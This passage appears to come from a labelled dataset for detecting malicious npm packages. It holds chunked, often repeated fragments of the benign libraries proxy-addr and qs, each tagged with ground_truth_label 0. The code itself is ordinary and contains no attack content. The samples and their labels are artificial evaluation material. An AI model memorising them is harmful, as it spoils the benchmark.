i++) {\n      var subnet = subnets[i]\n      var subnetip = subnet[0]\n      var subnetkind = subnetip.kind()\n      var subnetrange = subnet[1]\n      var trusted = ip\n\n      if (kind !== subnetkind) {\n        if (subnetkind === 'ipv4' && !ip.isIPv4MappedAddress()) {\n          // Incompatible IP\n==================================================\n\n# File: data/benign_samples/npm/popular/proxy-addr/2.0.7/package/index.js (function)\nfunction trust (addr) {\n    if (!isip(addr)) return false\n\n    var ip = parseip(addr)\n    var ipconv\n    var kind = ip.kind()\n\n    for (var i = 0; i < subnets.length; i++) {\n      var subnet = subnets[i]\n      var subnetip = subnet[0]\n      var subnetkind = subnetip.kind()\n      var subnetrange = subnet[1]\n      var trusted = ip\n\n      if (kind !== subnetkind) {\n        if (subnetkind === 'ipv4' && !ip.isIPv4MappedAddress()) {\n          // Incompatible IP addresses\n          continue\n        }\n\n\n==================================================\n\n# File: data/benign_samples/npm/popular/proxy-addr/2.0.7/package/index.js (function)\nfunction trustSingle (subnet) {\n  var subnetip = subnet[0]\n  var subnetkind = subnetip.kind()\n  var subnetisipv4 = subnetkind === 'ipv4'\n  var subnetrange = subnet[1]\n\n  return function trust (addr) {\n    if (!isip(addr)) return false\n\n    var ip = parseip(addr)\n    var kind = ip.kind()\n\n    if (kind !== subnetkind) {\n      if (subnetisipv4 && !ip.isIPv4MappedAddress()) {\n        // Incompatible IP addresses\n        return false\n      }\n\n      // Convert IP to match subnet IP kind\n      ip = sub\n==================================================\n\n# File: data/benign_samples/npm/popular/proxy-addr/2.0.7/package/index.js (function)\nfunction trust (addr) {\n    if (!isip(addr)) return false\n\n    var ip = parseip(addr)\n    var kind = ip.kind()\n\n    if (kind !== subnetkind) {\n      if (subnetisipv4 && !ip.isIPv4MappedAddress()) {\n        // Incompatible IP addresses\n        return false\n      }\n\n      // Convert IP to match subnet IP kind\n      ip = subnetisipv4\n        ? ip.toIPv4Address()\n        : ip.toIPv4MappedAddress()\n    }\n\n    return ip.match(subnetip, subnetrange)\n  }\n}\n\n==================================================\n",
      "file_paths": [
        "data/benign_samples/npm/popular/proxy-addr/2.0.7/package/index.js",
        "data/benign_samples/npm/popular/proxy-addr/2.0.7/package/index.js",
        "data/benign_samples/npm/popular/proxy-addr/2.0.7/package/index.js",
        "data/benign_samples/npm/popular/proxy-addr/2.0.7/package/index.js",
        "data/benign_samples/npm/popular/proxy-addr/2.0.7/package/index.js",
        "data/benign_samples/npm/popular/proxy-addr/2.0.7/package/index.js",
        "data/benign_samples/npm/popular/proxy-addr/2.0.7/package/index.js",
        "data/benign_samples/npm/popular/proxy-addr/2.0.7/package/index.js",
        "data/benign_samples/npm/popular/proxy-addr/2.0.7/package/index.js",
        "data/benign_samples/npm/popular/proxy-addr/2.0.7/package/index.js",
        "data/benign_samples/npm/popular/proxy-addr/2.0.7/package/index.js",
        "data/benign_samples/npm/popular/proxy-addr/2.0.7/package/index.js"
      ],
      "individual_files": {
        "data/benign_samples/npm/popular/proxy-addr/2.0.7/package/index.js": "function trust (addr) {\n    if (!isip(addr)) return false\n\n    var ip = parseip(addr)\n    var kind = ip.kind()\n\n    if (kind !== subnetkind) {\n      if (subnetisipv4 && !ip.isIPv4MappedAddress()) {\n        // Incompatible IP addresses\n        return false\n      }\n\n      // Convert IP to match subnet IP kind\n      ip = subnetisipv4\n        ? ip.toIPv4Address()\n        : ip.toIPv4MappedAddress()\n    }\n\n    return ip.match(subnetip, subnetrange)\n  }\n}\n"
      },
      "package_size_bytes": 7609,
      "num_files": 12,
      "metadata": {
        "package_hash": "npm_proxy-addr_2.0.7",
        "malicious_label": 0.0
      }
    },
    {
      "package_name": "qs",
      "ecosystem": "npm",
      "sample_type": "benign",
      "ground_truth_label": 0,
      "raw_content": "\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/test/stringify.js (function)\nvar encodeWithN = function (value, defaultEncoder, charset) {\n            var result = defaultEncoder(value, defaultEncoder, charset);\n            return typeof value === 'bigint' ? result + 'n' : result;\n        };\n        st.equal(qs.stringify(three), '');\n        st.equal(qs.stringify([three]), '0=3');\n        st.equal(qs.stringify([three], { encoder: encodeWithN }), '0=3n');\n        st.equal(qs.stringify({ a: three }), 'a=3');\n        st.equal(qs.stringify({ a: three }, { encoder: encodeWith\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/test/stringify.js (function)\nvar filterFunc = function (prefix, value) {\n            calls += 1;\n            if (calls === 1) {\n                st.equal(prefix, '', 'prefix is empty');\n                st.equal(value, obj);\n            } else if (prefix === 'c') {\n                return void 0;\n            } else if (value instanceof Date) {\n                st.equal(prefix, 'e[f]');\n                return value.getTime();\n            }\n            return value;\n        };\n\n        st.equal(qs.stringify(obj, { filter: filterF\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/test/stringify.js (function)\nvar sort = function (a, b) {\n            return a.localeCompare(b);\n        };\n        st.equal(qs.stringify({ a: 'c', z: 'y', b: 'f' }, { sort: sort }), 'a=c&b=f&z=y');\n        st.equal(qs.stringify({ a: 'c', z: { j: 'a', i: 'b' }, b: 'f' }, { sort: sort }), 'a=c&b=f&z%5Bi%5D=b&z%5Bj%5D=a');\n        st.end();\n    });\n\n    t.test('can sort the keys at depth 3 or more too', function (st) {\n        var sort = function (a, b) {\n            return a.localeCompare(b);\n        };\n        st.equal(\n   \n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/test/stringify.js (function)\nvar sort = function (a, b) {\n            return a.localeCompare(b);\n        };\n        st.equal(\n            qs.stringify(\n                { a: 'a', z: { zj: { zjb: 'zjb', zja: 'zja' }, zi: { zib: 'zib', zia: 'zia' } }, b: 'b' },\n                { sort: sort, encode: false }\n            ),\n            'a=a&b=b&z[zi][zia]=zia&z[zi][zib]=zib&z[zj][zja]=zja&z[zj][zjb]=zjb'\n        );\n        st.equal(\n            qs.stringify(\n                { a: 'a', z: { zj: { zjb: 'zjb', zja: 'zja' }, zi: { zib\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/test/stringify.js (function)\nvar filter = function (prefix, value) {\n            return value;\n        };\n\n        var options = { strictNullHandling: true, filter: filter };\n        st.equal(qs.stringify({ key: null }, options), 'key');\n        st.end();\n    });\n\n    t.test('strictNullHandling works with null serializeDate', function (st) {\n        var serializeDate = function () {\n            return null;\n        };\n        var options = { strictNullHandling: true, serializeDate: serializeDate };\n        var date = new Da\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/test/stringify.js (function)\nvar serializeDate = function () {\n            return null;\n        };\n        var options = { strictNullHandling: true, serializeDate: serializeDate };\n        var date = new Date();\n        st.equal(qs.stringify({ key: date }, options), 'key');\n        st.end();\n    });\n\n    t.test('allows for encoding keys and values differently', function (st) {\n        var encoder = function (str, defaultEncoder, charset, type) {\n            if (type === 'key') {\n                return defaultEncoder(str, de\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/test/stringify.js (function)\nvar encoder = function (str, defaultEncoder, charset, type) {\n            if (type === 'key') {\n                return defaultEncoder(str, defaultEncoder, charset, type).toLowerCase();\n            }\n            if (type === 'value') {\n                return defaultEncoder(str, defaultEncoder, charset, type).toUpperCase();\n            }\n            throw 'this should never happen! type: ' + type;\n        };\n\n        st.deepEqual(qs.stringify({ KeY: 'vAlUe' }, { encoder: encoder }), 'key=VALUE');\n\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/test/stringify.js (function)\nencoder: function (str) {\n                if (str.length === 0) {\n                    return '';\n                }\n                var buf = iconv.encode(str, 'shiftjis');\n                var result = [];\n                for (var i = 0; i < buf.length; ++i) {\n                    result.push(buf.readUInt8(i).toString(16));\n                }\n                return '%' + result.join('%');\n            }\n        }), '%8c%a7=%91%e5%8d%e3%95%7b&=');\n        st.end();\n    });\n\n    t.test('receives the d\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/test/stringify.js (function)\nencoder: function (str) {\n                st.match(typeof str, /^(?:string|number|boolean)$/);\n                return '';\n            }\n        });\n\n        st.end();\n    });\n\n    t.test('receives the default encoder as a second argument', function (st) {\n        st.plan(2);\n\n        qs.stringify({ a: 1 }, {\n            encoder: function (str, defaultEncoder) {\n                st.equal(defaultEncoder, utils.encode);\n            }\n        });\n\n        st.end();\n    });\n\n    t.test('throws error w\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/test/stringify.js (function)\nencoder: function (str, defaultEncoder) {\n                st.equal(defaultEncoder, utils.encode);\n            }\n        });\n\n        st.end();\n    });\n\n    t.test('throws error with wrong encoder', function (st) {\n        st['throws'](function () {\n            qs.stringify({}, { encoder: 'string' });\n        }, new TypeError('Encoder has to be a function.'));\n        st.end();\n    });\n\n    t.test('can use custom encoder for a buffer object', { skip: typeof Buffer === 'undefined' }, function (st)\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/test/stringify.js (function)\nencoder: function (buffer) {\n                if (typeof buffer === 'string') {\n                    return buffer;\n                }\n                return String.fromCharCode(buffer.readUInt8(0) + 97);\n            }\n        }), 'a=b');\n\n        st.equal(qs.stringify({ a: SaferBuffer.from('a b') }, {\n            encoder: function (buffer) {\n                return buffer;\n            }\n        }), 'a=a b');\n        st.end();\n    });\n\n    t.test('serializeDate option', function (st) {\n        var d\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/test/stringify.js (function)\nencoder: function (buffer) {\n                return buffer;\n            }\n        }), 'a=a b');\n        st.end();\n    });\n\n    t.test('serializeDate option', function (st) {\n        var date = new Date();\n        st.equal(\n            qs.stringify({ a: date }),\n            'a=' + date.toISOString().replace(/:/g, '%3A'),\n            'default is toISOString'\n        );\n\n        var mutatedDate = new Date();\n        mutatedDate.toISOString = function () {\n            throw new SyntaxError();\n      \n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/test/stringify.js (function)\nserializeDate: function (d) { return d.getTime() * 7; } }\n            ),\n            'a=42',\n            'custom serializeDate function called'\n        );\n\n        st.equal(\n            qs.stringify(\n                { a: [date] },\n                {\n                    serializeDate: function (d) { return d.getTime(); },\n                    arrayFormat: 'comma'\n                }\n            ),\n            'a=' + date.getTime(),\n            'works with arrayFormat comma'\n        );\n        st.equa\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/test/stringify.js (function)\nserializeDate: function (d) { return d.getTime(); },\n                    arrayFormat: 'comma'\n                }\n            ),\n            'a=' + date.getTime(),\n            'works with arrayFormat comma'\n        );\n        st.equal(\n            qs.stringify(\n                { a: [date] },\n                {\n                    serializeDate: function (d) { return d.getTime(); },\n                    arrayFormat: 'comma',\n                    commaRoundTrip: true\n                }\n            ),\n  \n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/test/stringify.js (function)\nserializeDate: function (d) { return d.getTime(); },\n                    arrayFormat: 'comma',\n                    commaRoundTrip: true\n                }\n            ),\n            'a%5B%5D=' + date.getTime(),\n            'works with arrayFormat comma'\n        );\n\n        st.end();\n    });\n\n    t.test('RFC 1738 serialization', function (st) {\n        st.equal(qs.stringify({ a: 'b c' }, { format: qs.formats.RFC1738 }), 'a=b+c');\n        st.equal(qs.stringify({ 'a b': 'c d' }, { format: qs.formats\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/test/parse.js (function)\nvar decoder = function (str, defaultDecoder, charset, type) {\n            if (!isNaN(Number(str))) {\n                return parseFloat(str);\n            }\n            return defaultDecoder(str, defaultDecoder, charset, type);\n        };\n\n        st.deepEqual(qs.parse('foo=1', { comma: true, decoder: decoder }), { foo: 1 });\n        st.deepEqual(qs.parse('foo=0', { comma: true, decoder: decoder }), { foo: 0 });\n\n        st.end();\n    });\n\n    t.test('parses brackets holds array of arrays when hav\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/test/parse.js (function)\nvar decoder = function (str, defaultDecoder, charset, type) {\n            if (type === 'key') {\n                return defaultDecoder(str, defaultDecoder, charset, type).toLowerCase();\n            }\n            if (type === 'value') {\n                return defaultDecoder(str, defaultDecoder, charset, type).toUpperCase();\n            }\n            throw 'this should never happen! type: ' + type;\n        };\n\n        st.deepEqual(qs.parse('KeY=vAlUe', { decoder: decoder }), { key: 'VALUE' });\n    \n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/test/parse.js (function)\ndecoder: function (str) {\n                var reg = /%([0-9A-F]{2})/ig;\n                var result = [];\n                var parts = reg.exec(str);\n                while (parts) {\n                    result.push(parseInt(parts[1], 16));\n                    parts = reg.exec(str);\n                }\n                return String(iconv.decode(SaferBuffer.from(result), 'shift_jis'));\n            }\n        }), { \u770c: '\u5927\u962a\u5e9c' });\n        st.end();\n    });\n\n    t.test('receives the default decoder as a seco\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/test/parse.js (function)\ndecoder: function (str, defaultDecoder) {\n                st.equal(defaultDecoder, utils.decode);\n            }\n        });\n        st.end();\n    });\n\n    t.test('throws error with wrong decoder', function (st) {\n        st['throws'](function () {\n            qs.parse({}, { decoder: 'string' });\n        }, new TypeError('Decoder has to be a function.'));\n        st.end();\n    });\n\n    t.test('does not mutate the options argument', function (st) {\n        var options = {};\n        qs.parse('a[b]=\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/test/parse.js (function)\ndecoder: function (str, defaultDecoder, charset) {\n                return str ? defaultDecoder(str, defaultDecoder, charset) : null;\n            },\n            interpretNumericEntities: true\n        }), { foo: null, bar: '\u263a' });\n        st.end();\n    });\n\n    t.test('does not interpret numeric entities in iso-8859-1 when `interpretNumericEntities` is absent', function (st) {\n        st.deepEqual(qs.parse('foo=' + urlEncodedNumSmiley, { charset: 'iso-8859-1' }), { foo: '&#9786;' });\n        st.en\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/test/utils.js (function)\nfunction f() {};\n    t.deepEqual(\n        utils.merge(func, { foo: 'bar' }),\n        [func, { foo: 'bar' }],\n        'functions can not be merged into'\n    );\n\n    func.bar = 'baz';\n    t.deepEqual(\n        utils.merge({ foo: 'bar' }, func),\n        { foo: 'bar', bar: 'baz' },\n        'functions can be merge sources'\n    );\n\n    t.test(\n        'avoids invoking array setters unnecessarily',\n        { skip: typeof Object.defineProperty !== 'function' },\n        function (st) {\n            var set\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/test/utils.js (function)\nget: function () {\n                    getCount += 1;\n                    return { bar: 'baz' };\n                },\n                set: function () { setCount += 1; }\n            });\n            utils.merge(observed, [null]);\n            st.equal(setCount, 0);\n            st.equal(getCount, 1);\n            observed[0] = observed[0]; // eslint-disable-line no-self-assign\n            st.equal(setCount, 1);\n            st.equal(getCount, 2);\n            st.end();\n        }\n    );\n\n    t.end();\n});\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/test/utils.js (function)\nset: function () { setCount += 1; }\n            });\n            utils.merge(observed, [null]);\n            st.equal(setCount, 0);\n            st.equal(getCount, 1);\n            observed[0] = observed[0]; // eslint-disable-line no-self-assign\n            st.equal(setCount, 1);\n            st.equal(getCount, 2);\n            st.end();\n        }\n    );\n\n    t.end();\n});\n\ntest('assign()', function (t) {\n    var target = { a: 1, b: 2 };\n    var source = { b: 3, c: 4 };\n    var result = utils.assign(ta\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/test/utils.js (function)\ntoString: function () { return '(abc)'; } }),\n        '%28abc%29',\n        'toStrings and encodes parentheses'\n    );\n\n    t.equal(\n        utils.encode('abc 123 \ud83d\udca9', null, 'iso-8859-1'),\n        'abc%20123%20%26%2355357%3B%26%2356489%3B',\n        'encodes in iso-8859-1'\n    );\n\n    var longString = '';\n    var expectedString = '';\n    for (var i = 0; i < 1500; i++) {\n        longString += ' ';\n        expectedString += '%20';\n    }\n\n    t.equal(\n        utils.encode(longString),\n        expected\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/test/empty-keys-cases.js (file)\n'use strict';\n\nmodule.exports = {\n    emptyTestCases: [\n        {\n            input: '&',\n            withEmptyKeys: {},\n            stringifyOutput: {\n                brackets: '',\n                indices: '',\n                repeat: ''\n            },\n            noEmptyKeys: {}\n        },\n        {\n            input: '&&',\n            withEmptyKeys: {},\n            stringifyOutput: {\n                brackets: '',\n                indices: '',\n                repeat: ''\n            },\n            noEmptyKeys: {}\n        },\n        {\n            input: '&=',\n            withEmptyKeys: { '': '' },\n            stringifyOutput: {\n                brackets: '=',\n                indices: '=',\n                repeat: '='\n            },\n            noEmptyKeys: {}\n        },\n        {\n            input: '&=&',\n            withEmptyKeys: { '': '' },\n            stringifyOutput: {\n                brackets: '=',\n                indices: '=',\n                repeat: '='\n            },\n            noEmptyKeys: {}\n        },\n        {\n            input: '&=&=',\n            withEmptyKeys: { '': ['', ''] },\n            stringifyOutput: {\n                brackets: '[]=&[]=',\n                indices: '[0]=&[1]=',\n                repeat: '=&='\n            },\n            noEmptyKeys: {}\n        },\n        {\n            input: '&=&=&',\n            withEmptyKeys: { '': ['', ''] },\n            stringifyOutput: {\n                brackets: '[]=&[]=',\n                indices: '[0]=&[1]=',\n                repeat: '=&='\n            },\n            noEmptyKeys: {}\n        },\n        {\n            input: '=',\n            withEmptyKeys: { '': '' },\n            noEmptyKeys: {},\n            stringifyOutput: {\n                brackets: '=',\n                indices: '=',\n                repeat: '='\n            }\n        },\n        {\n            input: '=&',\n            withEmptyKeys: { '': '' },\n            stringifyOutput: {\n                brackets: '=',\n                indices: '=',\n                repeat: '='\n            },\n            noEmptyKeys: {}\n        },\n        {\n            input: '=&&&',\n            withEmptyKeys: { '': '' },\n            stringifyOutput: {\n                brackets: '=',\n                indices: '=',\n                repeat: '='\n            },\n            noEmptyKeys: {}\n        },\n        {\n            input: '=&=&=&',\n            withEmptyKeys: { '': ['', '', ''] },\n            stringifyOutput: {\n                brackets: '[]=&[]=&[]=',\n                indices: '[0]=&[1]=&[2]=',\n                repeat: '=&=&='\n            },\n            noEmptyKeys: {}\n        },\n        {\n            input: '=&a[]=b&a[1]=c',\n            withEmptyKeys: { '': '', a: ['b', 'c'] },\n            stringifyOutput: {\n                brackets: '=&a[]=b&a[]=c',\n                indices: '=&a[0]=b&a[1]=c',\n                repeat: '=&a=b&a=c'\n            },\n            noEmptyKeys: { a: ['b', 'c'] }\n        },\n        {\n            input: '=a',\n            withEmptyKeys: { '': 'a' },\n            noEmptyKeys: {},\n            stringifyOutput: {\n                brackets: '=a',\n                indices: '=a',\n                repeat: '=a'\n            }\n        },\n        {\n            input: 'a==a',\n            withEmptyKeys: { a: '=a' },\n            noEmptyKeys: { a: '=a' },\n            stringifyOutput: {\n                brackets: 'a==a',\n                indices: 'a==a',\n                repeat: 'a==a'\n            }\n        },\n        {\n            input: '=&a[]=b',\n            withEmptyKeys: { '': '', a: ['b'] },\n            stringifyOutput: {\n                brackets: '=&a[]=b',\n                indices: '=&a[0]=b',\n                repeat: '=&a=b'\n            },\n            noEmptyKeys: { a: ['b'] }\n        },\n        {\n            input: '=&a[]=b&a[]=c&a[2]=d',\n            withEmptyKeys: { '': '', a: ['b', 'c', 'd'] },\n            stringifyOutput: {\n                brackets: '=&a[]=b&a[]=c&a[]=d',\n                indices: '=&a[0]=b&a[1]=c&a[2]=d',\n                repeat: '=&a=b&a=c&a=d'\n            },\n            noEmptyKeys: { a: ['b', 'c', 'd'] }\n        },\n        {\n            input: '=a&=b',\n            withEmptyKeys: { '': ['a', 'b'] },\n            stringifyOutput: {\n                brackets: '[]=a&[]=b',\n                indices: '[0]=a&[1]=b',\n                repeat: '=a&=b'\n            },\n            noEmptyKeys: {}\n        },\n        {\n            input: '=a&foo=b',\n            withEmptyKeys: { '': 'a', foo: 'b' },\n            noEmptyKeys: { foo: 'b' },\n            stringifyOutput: {\n                brackets: '=a&foo=b',\n                indices: '=a&foo=b',\n                repeat: '=a&foo=b'\n            }\n        },\n        {\n            input: 'a[]=b&a=c&=',\n            withEmptyKeys: { '': '', a: ['b', 'c'] },\n            stringifyOutput: {\n                brackets: '=&a[]=b&a[]=c',\n                indices: '=&a[0]=b&a[1]=c',\n                repeat: '=&a=b&a=c'\n            },\n            noEmptyKeys: { a: ['b', 'c'] }\n        },\n        {\n            input: 'a[]=b&a=c&=',\n            withEmptyKeys: { '': '', a: ['b', 'c'] },\n            stringifyOutput: {\n                brackets: '=&a[]=b&a[]=c',\n                indices: '=&a[0]=b&a[1]=c',\n                repeat: '=&a=b&a=c'\n            },\n            noEmptyKeys: { a: ['b', 'c'] }\n        },\n        {\n            input: 'a[0]=b&a=c&=',\n            withEmptyKeys: { '': '', a: ['b', 'c'] },\n            stringifyOutput: {\n                brackets: '=&a[]=b&a[]=c',\n                indices: '=&a[0]=b&a[1]=c',\n                repeat: '=&a=b&a=c'\n            },\n            noEmptyKeys: { a: ['b', 'c'] }\n        },\n        {\n            input: 'a=b&a[]=c&=',\n            withEmptyKeys: { '': '', a: ['b', 'c'] },\n            stringifyOutput: {\n                brackets: '=&a[]=b&a[]=c',\n                indices: '=&a[0]=b&a[1]=c',\n                repeat: '=&a=b&a=c'\n            },\n            noEmptyKeys: { a: ['b', 'c'] }\n        },\n        {\n            input: 'a=b&a[0]=c&=',\n            withEmptyKeys: { '': '', a: ['b', 'c'] },\n            stringifyOutput: {\n                brackets: '=&a[]=b&a[]=c',\n                indices: '=&a[0]=b&a[1]=c',\n                repeat: '=&a=b&a=c'\n            },\n            noEmptyKeys: { a: ['b', 'c'] }\n        },\n        {\n            input: '[]=a&[]=b& []=1',\n            withEmptyKeys: { '': ['a', 'b'], ' ': ['1'] },\n            stringifyOutput: {\n                brackets: '[]=a&[]=b& []=1',\n                indices: '[0]=a&[1]=b& [0]=1',\n                repeat: '=a&=b& =1'\n            },\n            noEmptyKeys: { 0: 'a', 1: 'b', ' ': ['1'] }\n        },\n        {\n            input: '[0]=a&[1]=b&a[0]=1&a[1]=2',\n            withEmptyKeys: { '': ['a', 'b'], a: ['1', '2'] },\n            noEmptyKeys: { 0: 'a', 1: 'b', a: ['1', '2'] },\n            stringifyOutput: {\n                brackets: '[]=a&[]=b&a[]=1&a[]=2',\n                indices: '[0]=a&[1]=b&a[0]=1&a[1]=2',\n                repeat: '=a&=b&a=1&a=2'\n            }\n        },\n        {\n            input: '[deep]=a&[deep]=2',\n            withEmptyKeys: { '': { deep: ['a', '2'] }\n            },\n            stringifyOutput: {\n                brackets: '[deep][]=a&[deep][]=2',\n                indices: '[deep][0]=a&[deep][1]=2',\n                repeat: '[deep]=a&[deep]=2'\n            },\n            noEmptyKeys: { deep: ['a', '2'] }\n        },\n        {\n            input: '%5B0%5D=a&%5B1%5D=b',\n            withEmptyKeys: { '': ['a', 'b'] },\n            stringifyOutput: {\n                brackets: '[]=a&[]=b',\n                indices: '[0]=a&[1]=b',\n                repeat: '=a&=b'\n            },\n            noEmptyKeys: { 0: 'a', 1: 'b' }\n        }\n    ]\n};\n\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/lib/stringify.js (function)\nfunction brackets(prefix) {\n        return prefix + '[]';\n    },\n    comma: 'comma',\n    indices: function indices(prefix, key) {\n        return prefix + '[' + key + ']';\n    },\n    repeat: function repeat(prefix) {\n        return prefix;\n    }\n};\n\nvar isArray = Array.isArray;\nvar push = Array.prototype.push;\nvar pushToArray = function (arr, valueOrArray) {\n    push.apply(arr, isArray(valueOrArray) ? valueOrArray : [valueOrArray]);\n};\n\nvar toISO = Date.prototype.toISOString;\n\nvar defaultFormat =\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/lib/stringify.js (function)\nfunction indices(prefix, key) {\n        return prefix + '[' + key + ']';\n    },\n    repeat: function repeat(prefix) {\n        return prefix;\n    }\n};\n\nvar isArray = Array.isArray;\nvar push = Array.prototype.push;\nvar pushToArray = function (arr, valueOrArray) {\n    push.apply(arr, isArray(valueOrArray) ? valueOrArray : [valueOrArray]);\n};\n\nvar toISO = Date.prototype.toISOString;\n\nvar defaultFormat = formats['default'];\nvar defaults = {\n    addQueryPrefix: false,\n    allowDots: false,\n    allowEm\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/lib/stringify.js (function)\nfunction repeat(prefix) {\n        return prefix;\n    }\n};\n\nvar isArray = Array.isArray;\nvar push = Array.prototype.push;\nvar pushToArray = function (arr, valueOrArray) {\n    push.apply(arr, isArray(valueOrArray) ? valueOrArray : [valueOrArray]);\n};\n\nvar toISO = Date.prototype.toISOString;\n\nvar defaultFormat = formats['default'];\nvar defaults = {\n    addQueryPrefix: false,\n    allowDots: false,\n    allowEmptyArrays: false,\n    arrayFormat: 'indices',\n    charset: 'utf-8',\n    charsetSentinel: fal\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/lib/stringify.js (function)\nfunction serializeDate(date) {\n        return toISO.call(date);\n    },\n    skipNulls: false,\n    strictNullHandling: false\n};\n\nvar isNonNullishPrimitive = function isNonNullishPrimitive(v) {\n    return typeof v === 'string'\n        || typeof v === 'number'\n        || typeof v === 'boolean'\n        || typeof v === 'symbol'\n        || typeof v === 'bigint';\n};\n\nvar sentinel = {};\n\nvar stringify = function stringify(\n    object,\n    prefix,\n    generateArrayPrefix,\n    commaRoundTrip,\n    allowEmpt\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/lib/stringify.js (function)\nfunction isNonNullishPrimitive(v) {\n    return typeof v === 'string'\n        || typeof v === 'number'\n        || typeof v === 'boolean'\n        || typeof v === 'symbol'\n        || typeof v === 'bigint';\n};\n\nvar sentinel = {};\n\nvar stringify = function stringify(\n    object,\n    prefix,\n    generateArrayPrefix,\n    commaRoundTrip,\n    allowEmptyArrays,\n    strictNullHandling,\n    skipNulls,\n    encodeDotInKeys,\n    encoder,\n    filter,\n    sort,\n    allowDots,\n    serializeDate,\n    format,\n    f\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/lib/stringify.js (function)\nfunction stringify(\n    object,\n    prefix,\n    generateArrayPrefix,\n    commaRoundTrip,\n    allowEmptyArrays,\n    strictNullHandling,\n    skipNulls,\n    encodeDotInKeys,\n    encoder,\n    filter,\n    sort,\n    allowDots,\n    serializeDate,\n    format,\n    formatter,\n    encodeValuesOnly,\n    charset,\n    sideChannel\n) {\n    var obj = object;\n\n    var tmpSc = sideChannel;\n    var step = 0;\n    var findFlag = false;\n    while ((tmpSc = tmpSc.get(sentinel)) !== void undefined && !findFlag) {\n      \n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/lib/stringify.js (function)\nfunction normalizeStringifyOptions(opts) {\n    if (!opts) {\n        return defaults;\n    }\n\n    if (typeof opts.allowEmptyArrays !== 'undefined' && typeof opts.allowEmptyArrays !== 'boolean') {\n        throw new TypeError('`allowEmptyArrays` option can only be `true` or `false`, when provided');\n    }\n\n    if (typeof opts.encodeDotInKeys !== 'undefined' && typeof opts.encodeDotInKeys !== 'boolean') {\n        throw new TypeError('`encodeDotInKeys` option can only be `true` or `false`, when provid\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/lib/stringify.js (function)\nvar pushToArray = function (arr, valueOrArray) {\n    push.apply(arr, isArray(valueOrArray) ? valueOrArray : [valueOrArray]);\n};\n\nvar toISO = Date.prototype.toISOString;\n\nvar defaultFormat = formats['default'];\nvar defaults = {\n    addQueryPrefix: false,\n    allowDots: false,\n    allowEmptyArrays: false,\n    arrayFormat: 'indices',\n    charset: 'utf-8',\n    charsetSentinel: false,\n    commaRoundTrip: false,\n    delimiter: '&',\n    encode: true,\n    encodeDotInKeys: false,\n    encoder: utils.encod\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/lib/index.js (file)\n'use strict';\n\nvar stringify = require('./stringify');\nvar parse = require('./parse');\nvar formats = require('./formats');\n\nmodule.exports = {\n    formats: formats,\n    parse: parse,\n    stringify: stringify\n};\n\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/lib/parse.js (function)\nfunction parseQueryStringValues(str, options) {\n    var obj = { __proto__: null };\n\n    var cleanStr = options.ignoreQueryPrefix ? str.replace(/^\\?/, '') : str;\n    cleanStr = cleanStr.replace(/%5B/gi, '[').replace(/%5D/gi, ']');\n\n    var limit = options.parameterLimit === Infinity ? undefined : options.parameterLimit;\n    var parts = cleanStr.split(\n        options.delimiter,\n        options.throwOnLimitExceeded ? limit + 1 : limit\n    );\n\n    if (options.throwOnLimitExceeded && parts.length > \n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/lib/parse.js (function)\nfunction parseQueryStringKeys(givenKey, val, options, valuesParsed) {\n    if (!givenKey) {\n        return;\n    }\n\n    // Transform dot notation to bracket notation\n    var key = options.allowDots ? givenKey.replace(/\\.([^.[]+)/g, '[$1]') : givenKey;\n\n    // The regex chunks\n\n    var brackets = /(\\[[^[\\]]*])/;\n    var child = /(\\[[^[\\]]*])/g;\n\n    // Get the parent\n\n    var segment = options.depth > 0 && brackets.exec(key);\n    var parent = segment ? key.slice(0, segment.index) : key;\n\n    // Sta\n==================================================\n\n# File: data/benign_samples/npm/popular/qs/6.14.0/package/lib/parse.js (function)\nfunction normalizeParseOptions(opts) {\n    if (!opts) {\n        return defaults;\n    }\n\n    if (typeof opts.allowEmptyArrays !== 'undefined' && typeof opts.allowEmptyArrays !== 'boolean') {\n        throw new TypeError('`allowEmptyArrays` option can only be `true` or `false`, when provided');\n    }\n\n    if (typeof opts.decodeDotInKeys !== 'undefined' && typeof opts.decodeDotInKeys !== 'boolean') {\n        throw new TypeError('`decodeDotInKeys` option can only be `true` or `false`, when provided')\n==================================================\n\n# File: 